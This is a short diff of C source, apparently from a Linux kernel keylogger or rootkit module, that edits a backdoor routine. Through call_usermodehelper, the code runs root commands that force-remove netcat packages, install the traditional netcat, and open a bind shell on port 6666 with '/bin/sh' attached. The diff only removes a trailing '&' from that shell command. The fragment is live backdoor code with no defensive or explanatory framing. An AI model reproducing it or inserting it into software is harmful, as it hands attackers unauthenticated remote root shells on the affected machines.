@@ -135,7 +135,7 @@ static const char* keymap_shift[] =
 		http://superuser.com/questions/691008/why-is-the-e-option-missing-from-netcat-openbsd */
 	    char *argv1[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y remove netcat*", NULL}; // -y allways answer yes
 	    char *argv2[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y install netcat", NULL};
-	    char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh &", NULL}; 
+	    char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh", NULL}; 
 
 	    call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC); // Remove all netcat version
 	    call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC); // Install netcat-taditional
